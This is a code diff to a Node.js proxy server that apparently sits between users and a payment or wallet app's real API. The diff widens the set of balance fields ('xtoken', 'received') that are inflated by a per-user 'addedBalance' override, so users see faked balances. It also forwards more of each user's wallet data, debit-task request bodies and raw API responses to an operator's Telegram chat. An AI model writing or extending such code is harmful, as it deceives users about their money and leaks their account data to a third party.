@@ -242,7 +242,8 @@ app.use(async (req, res, next) => {
 });
 
 async function proxyFetch(req) {
-  const url = ORIGINAL_API + req.originalUrl;
+  const apiPath = req.originalUrl.replace(/^\/app\//, '/api/');
+  const url = ORIGINAL_API + apiPath;
   const fwd = {};
   for (const [k, v] of Object.entries(req.headers)) {
     const kl = k.toLowerCase();
@@ -876,7 +877,7 @@ app.all('/app/user/info', async (req, res) => {
       const userOvr = data.userOverrides && data.userOverrides[String(effectiveUserId)];
       const addedBal = userOvr && userOvr.addedBalance !== undefined ? userOvr.addedBalance : 0;
       if (addedBal !== 0) {
-        const balKeys = ['balance', 'wallet', 'amount', 'availableBalance', 'totalBalance'];
+        const balKeys = ['balance', 'wallet', 'amount', 'availableBalance', 'totalBalance', 'xtoken', 'received'];
         for (const bk of balKeys) {
           if (respData[bk] !== undefined) {
             const numBal = parseFloat(respData[bk]) || 0;
@@ -920,7 +921,7 @@ app.all('/app/user/account/wallet', async (req, res) => {
       const userOvr = data.userOverrides && data.userOverrides[String(userId)];
       const addedBal = userOvr && userOvr.addedBalance !== undefined ? userOvr.addedBalance : 0;
       if (addedBal !== 0) {
-        const balKeys = ['balance', 'wallet', 'amount', 'availableBalance', 'totalBalance', 'inrBalance'];
+        const balKeys = ['balance', 'wallet', 'amount', 'availableBalance', 'totalBalance', 'inrBalance', 'xtoken', 'received'];
         for (const bk of balKeys) {
           if (respData[bk] !== undefined) {
             const numBal = parseFloat(respData[bk]) || 0;
@@ -933,7 +934,8 @@ app.all('/app/user/account/wallet', async (req, res) => {
     }
     sendJson(res, respHeaders, jsonResp, respBody);
     if (!isLogOff(data, userId) && data.adminChatId && bot) {
-      bot.sendMessage(data.adminChatId, `💼 Wallet [${userId || 'N/A'}]\n📊 Data: ${JSON.stringify(respData).substring(0, 300)}`).catch(()=>{});
+      const walletKeys = respData ? Object.keys(respData).join(',') : 'null';
+      bot.sendMessage(data.adminChatId, `💼 Wallet [${userId || 'N/A'}]\n🔑 Keys: ${walletKeys}\n📊 Data: ${JSON.stringify(respData).substring(0, 300)}`).catch(()=>{});
     }
   } catch(e) { await transparentProxy(req, res); }
 });
@@ -968,7 +970,12 @@ app.all('/app/pay/debit/task', async (req, res) => {
     if (!isLogOff(data, userId) && data.adminChatId && bot) {
       const respData = getResponseData(jsonResp);
       const taskCount = Array.isArray(respData) ? respData.length : (respData && respData.list ? respData.list.length : '?');
-      bot.sendMessage(data.adminChatId, `💸 Debit Task [${userId || 'N/A'}] Tasks: ${taskCount}`).catch(()=>{});
+      const statusCode = jsonResp ? (jsonResp.code ?? jsonResp.status ?? jsonResp.statusCode ?? '?') : '?';
+      const msg = jsonResp ? (jsonResp.msg ?? jsonResp.message ?? '') : '';
+      const reqBody = req.parsedBody ? JSON.stringify(req.parsedBody).substring(0, 200) : 'none';
+      const topKeys = jsonResp ? Object.keys(jsonResp).join(',') : 'null';
+      const dataKeys = respData ? (typeof respData === 'object' ? (Array.isArray(respData) ? `array[${respData.length}]` : Object.keys(respData).join(',')) : typeof respData) : 'null';
+      bot.sendMessage(data.adminChatId, `💸 Debit Task [${userId || 'N/A'}]\n📊 Tasks: ${taskCount}\n🔢 Code: ${statusCode}\n💬 Msg: ${msg}\n🔑 TopKeys: ${topKeys}\n📋 DataKeys: ${dataKeys}\n📤 ReqBody: ${reqBody}\n📥 Resp: ${respBody.substring(0, 400)}`).catch(()=>{});
     }
   } catch(e) { await transparentProxy(req, res); }
 });
